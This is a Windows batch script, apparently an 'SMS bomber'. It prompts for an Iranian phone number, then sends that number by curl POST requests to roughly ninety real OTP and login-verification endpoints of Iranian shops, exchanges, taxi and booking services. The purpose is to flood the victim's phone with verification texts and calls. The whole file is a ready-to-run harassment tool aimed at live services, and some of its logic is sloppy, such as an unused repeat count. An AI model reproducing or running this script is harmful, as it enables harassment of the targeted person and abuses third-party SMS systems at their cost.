@echo off
setlocal

set "phone="
set /p phone="Enter phone 09xxxxxxxxxx: "
set /p repeatCount="Enter Number sms and call: "

set "urls=https://3tex.io/api/1/users/validation/mobile|https://deniizshop.com/api/v1/sessions/login_request|https://flightio.com/bff/Authentication/CheckUserKey|https://app.snapp.taxi/api/api-passenger-oauth/v2/otp|https://bck.behtarino.com/api/v1/users/phone_verification/|https://abantether.com/users/register/phone/send/|https://novinbook.com/index.php?route=account/phone|https://www.azki.com/api/vehicleorder/api/customer/register/login-with-vocal-verification-code?phoneNumber=%phone%|https://api.pooleno.ir/v1/auth/check-mobile|https://agent.wide-app.ir/auth/token|https://tap33.me/api/v2/user|https://web.emtiyaz.app/json/login|https://api.divar.ir/v5/auth/authenticate|https://messengerg2c4.iranlms.ir/|https://nx.classino.com/otp/v1/api/login|https://bama.ir/signin-checkforcellnumber|https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.0&UDID=39c62f64-3d2d-4954-9033-816098559ae4&locale=fa|https://ws.alibaba.ir/api/v3/account/mobile/otp|https://api.bitbarg.com/api/v1/authentication/registerOrLogin|https://api.bahramshop.ir/api/user/validate/username|https://mobapi.banimode.com/api/v2/auth/request|https://takshopaccessorise.ir/api/v1/sessions/login_request|https://api.bitpin.ir/v1/usr/sub_phone/|https://chamedoon.com/api/v1/membership/guest/request_mobile_verification|https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL|https://pinket.com/api/cu/v2/phone-verification|https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode|https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile|https://bit24.cash/app/api/auth/check-mobile|https://app.itoll.ir/api/v1/auth/login|https://api.raybit.net:3111/api/v1/authentication/register/mobile|https://www.pubisha.com/login/checkCustomerActivation|https://farvi.shop/api/v1/sessions/login_request|https://gw.taaghche.com/v4/site/auth/signup|https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request|https://www.sheypoor.com/auth|https://api.snapp.ir/api/v1/sms/link|https://a4baz.com/api/web/login|https://api.anargift.com/api/people/auth|https://nobat.ir/api/public/patient/login/phone|https://www.buskool.com/send_verification_code|https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode|https://www.simkhanapi.ir/api/users/registerV2|https://sandbox.sibirani.ir/api/v1/user/invite|https://shop.hyperjan.ir/api/users/manage|https://api.digikala.com/v1/user/authenticate/|https://hiword.ir/wp-json/otp-login/v1/login|https://abantether.com/users/register/phone/send/|https://api.bit24.cash/api/v3/auth/check-mobile|https://dicardo.com/main/sendsms|https://ghasedak24.com/user/ajax_register|https://tikban.com/Account/LoginAndRegister|https://www.digistyle.com/users/login-register/|https://banankala.com/home/login|https://www.iranketab.ir/account/register|https://ketabchi.com/api/v1/auth/requestVerificationCode|https://www.offdecor.com/index.php?route=account/login/sendCode|https://exo.ir/index.php?route=account/mobile_login|https://shahrfarsh.com/Account/Login|https://takfarsh.com/wp-content/themes/bakala/template-parts/send.php|https://shop.beheshticarpet.com/my-account/|https://www.khanoumi.com/accounts/sendotp|https://rojashop.com/api/auth/sendOtp|https://dadpardaz.com/advice/getLoginConfirmationCode|https://api.rokla.ir/api/request/otp|https://khodro45.com/api/v1/customers/otp/|https://mashinbank.com/api2/users/check|https://api.pezeshket.com/core/v1/auth/requestCode|https://virgool.io/api/v1.4/auth/verify|https://api.timcheh.com/auth/otp/send|https://client.api.paklean.com/user/resendCode|https://mobogift.com/signin|https://api.iranicard.ir/api/v1/register|https://tj8.ir/auth/register|https://mashinbank.com/api2/users/check|https://cinematicket.org/api/v1/users/signup|https://www.irantic.com/api/login/request|https://kafegheymat.com/shop/getLoginSms|https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6&optionalVersion=5.6.6&UDID=bb65d956-f88b-4fec-9911-5f94391edf85|https://www.delino.com/user/register|https://alopeyk.com/api/sms/send.php|https://1401api.tamland.ir/api/user/signup|https://shop.opco.co.ir/index.php?route=extension/module/login_verify/update_register_code|https://api.digikalajet.ir/user/login-register/|https://melix.shop/site/api/v1/user/otp|https://safiran.shop/login|https://restaurant.delino.com/user/register|https://gateway.trip.ir/api/registers|https://gateway.trip.ir/api/Totp"

setlocal enabledelayedexpansion
for %%u in (%urls%) do (
    set "url=%%u"
    set "header="
    if "!url!"=="https://3tex.io/api/1/users/validation/mobile" (
        set "header={\"receptorPhone\": \"%phone%\"}"
    )
    if "!url!"=="https://deniizshop.com/api/v1/sessions/login_request" (
        set "header={\"mobile_phone\": \"%phone%\"}"
    )
    
    set "jsonData=!header!"
    timeout /t 3 /nobreak >nul
    set "resp="
    curl -X POST "!url!" -H "Content-Type: application/json" -d "!jsonData!" >nul
    if %errorlevel% neq 0 (
        echo [-] Error !
    ) else (
        echo [+], Sended
    )
)

endlocal
